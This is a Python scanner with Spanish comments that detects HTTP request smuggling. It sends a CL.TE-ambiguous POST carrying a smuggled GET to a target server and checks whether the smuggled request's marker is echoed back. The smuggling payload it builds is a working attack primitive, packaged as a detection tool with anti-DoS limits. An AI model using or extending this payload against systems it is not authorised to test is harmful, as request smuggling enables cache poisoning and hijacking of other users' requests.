#!/usr/bin/env python3
"""EDGESYNC-HUNT (v0.72.0): detector de desync edge->back (HTTP
request smuggling) por tecnica del ECO.

Filosofia (Kettle): el front y el back negocian distinto donde
termina un request (CL vs TE). Si mandamos un POST ambiguo cuyo
CL cubre TODO el request smuggleado, el front lo ve como CUERPO
(nunca como request), pero un back que prefiera TE lo ejecuta
como request propio. El ECO: recibimos una respuesta extra que
nunca pedimos.

Senales:
  DESYNC-DEMO   el marker del request smuggleado aparece en una
                respuesta (bug demostrado, lectura A->B)
  SOSPECHA      numero de respuestas distinto al esperado (2)
  SIN-DESYNC    todo cuadra (2 respuestas, sin marker)

SEGURIDAD (anti-DoS, no negociable):
  - max MAX_PROBES conexiones/probes por target (default 10)
  - 1 sola conexion por corrida, secuencial
  - pausa COOLDOWN entre probes
  - NO loops, NO flood, NO RST, cuerpo <= 4KB
  - verificacion A->B: solo se LEE, nunca se modifica estado del
    target (el path smuggleado es de lectura)
"""
import argparse
import json
import socket
import ssl
import time
from urllib.parse import urlparse

MAX_PROBES = 10
COOLDOWN = 0.4
MAX_BODY = 4096

SMUG_PATH = "/x-edgesync-sonde-{}"
SMUG_MARKER = "x-edgesync-echo"


def _connect(url, timeout=10.0):
    u = urlparse(url if "//" in url else "http://" + url)
    host = u.hostname or "127.0.0.1"
    port = u.port or (443 if u.scheme == "https" else 80)
    s = socket.create_connection((host, port), timeout=timeout)
    if u.scheme == "https":
        ctx = ssl.create_default_context()
        s = ctx.wrap_socket(s, server_hostname=host)
    return s, host


def _read_all(sock, quiet=0.8, cap=65535):
    sock.settimeout(quiet)
    out = b""
    try:
        while len(out) < cap:
            d = sock.recv(65535)
            if not d:
                break
            out += d
    except socket.timeout:
        pass
    return out


def _split_responses(raw):
    return raw.split(b"HTTP/1.1 ")


def _resp_text(raw):
    return raw.decode("latin-1", errors="replace")


def _build_probe(host, smug_path):
    smuggled = (f"GET {smug_path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"X-Echo: {SMUG_MARKER}\r\n\r\n").encode()
    body = b"0\r\n\r\n" + smuggled
    if len(body) > MAX_BODY:
        raise ValueError("cuerpo excede tope anti-DoS")
    probe = (b"POST / HTTP/1.1\r\n"
             b"Host: " + host.encode() + b"\r\n"
             b"Content-Length: " + str(len(body)).encode() + b"\r\n"
             b"Transfer-Encoding: chunked\r\n"
             b"Content-Type: application/x-www-form-urlencoded\r\n\r\n"
             + body)
    sonda = (f"GET / HTTP/1.1\r\nHost: {host}\r\n\r\n").encode()
    return probe, sonda


def audit(cfg):
    """cfg: url, timeout. Devuelve veredicto + evidencia.
    Presupuesto cerrado: 3 requests totales (baseline+probe+sonda).
    """
    url = cfg["url"]
    timeout = float(cfg.get("timeout", 10.0))
    smug_path = cfg.get("smug_path") or SMUG_PATH.format(int(time.time()))
    host_header = urlparse(url if "//" in url else "http://" + url).hostname

    probes = 0
    evid = {"url": url, "probes": probes, "max_probes": MAX_PROBES,
            "smug_path": smug_path}

    # fase 1: baseline (el target debe responder)
    s, host = _connect(url, timeout)
    probes += 1
    s.sendall(f"GET / HTTP/1.1\r\nHost: {host}\r\n\r\n".encode())
    base = _read_all(s)
    s.close()
    time.sleep(COOLDOWN)
    if not base.strip():
        return {"veredicto": "NO-RESPONDE", "evidencia": evid}

    # fase 2: probe ambiguo + sonda en la MISMA conexion
    s, host = _connect(url, timeout)
    probes += 1
    probe, sonda = _build_probe(host_header, smug_path)
    s.sendall(probe)
    time.sleep(COOLDOWN)
    s.sendall(sonda)                      # probe extra dentro del budget
    probes += 1
    evid["probes"] = probes
    raw = _read_all(s, quiet=1.2)
    s.close()

    parts = _split_responses(raw)
    n_resp = len(parts) - 1 if parts and parts[0] == b"" else len(parts)
    n_resp = max(0, sum(1 for p in parts if b" " in p[:32]))
    evid["respuestas"] = n_resp
    txt = _resp_text(raw)
    hit = smug_path in txt or SMUG_MARKER in txt
    evid["marker_presente"] = hit
    evid["cuerpo_crudo_len"] = len(raw)

    if hit:
        return {"veredicto": "DESYNC-DEMO", "evidencia": evid}
    if n_resp != 2:
        evid["nota"] = ("conteo de respuestas distinto de 2: posible "
                        "desync parcial o front tipo h2")
        return {"veredicto": "SOSPECHA", "evidencia": evid}
    return {"veredicto": "SIN-DESYNC", "evidencia": evid}


def main():
    ap = argparse.ArgumentParser(description="EDGESYNC desync detector")
    ap.add_argument("url", help="http://target[:puerto]/")
    ap.add_argument("--timeout", type=float, default=10.0)
    ap.add_argument("--json", action="store_true")
    a = ap.parse_args()
    r = audit({"url": a.url, "timeout": a.timeout})
    if a.json:
        print(json.dumps(r, indent=2, default=str))
    else:
        print(f"[EDGESYNC] {a.url} -> {r['veredicto']}")
        for k, v in r["evidencia"].items():
            print(f"  {k}: {v}")


if __name__ == "__main__":
    main()
